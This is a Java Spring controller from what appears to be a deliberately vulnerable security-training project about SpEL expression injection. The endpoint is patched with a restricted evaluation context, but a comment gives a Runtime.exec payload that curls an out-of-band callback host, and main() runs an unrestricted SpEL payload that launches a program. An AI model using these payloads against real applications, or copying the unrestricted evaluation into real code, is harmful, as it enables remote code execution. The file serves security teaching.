package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Collections;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // Spring 4.3.6 has no SimpleEvaluationContext (added in 4.3.15), so build an equivalent
        // restricted context: no method calls, no constructors, no type references, no bean references.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setMethodResolvers(Collections.<MethodResolver>emptyList());
        context.setConstructorResolvers(Collections.<ConstructorResolver>emptyList());
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        Object value = parser.parseExpression(expression).getValue(context);
        return value == null ? "null" : HtmlUtils.htmlEscape(value.toString());
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

